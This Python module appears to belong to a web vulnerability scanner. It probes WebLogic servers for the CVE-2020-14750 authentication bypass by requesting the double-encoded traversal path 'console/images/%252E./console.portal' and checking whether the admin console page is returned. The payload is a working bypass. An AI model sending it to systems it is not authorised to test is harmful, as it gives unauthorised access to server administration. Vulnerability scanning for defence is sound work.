#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Weblogic扫描类: 
        Weblogic 权限验证绕过漏洞
            CVE-2020-14750
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Weblogic():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Weblogic'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_14750_payloads = [
            {
                'path': 'console/images/%252E./console.portal',
                'data': ''
            }
        ]

    def cve_2020_14750_scan(self, url):
        ''' Weblogic 权限验证绕过漏洞
                可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2020-14750'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_14750_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (('管理控制台' in res.text) or ('Information and Resources' in res.text) or ('Overloaded' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_14750_scan, url=url),
        ]

weblogic = Weblogic()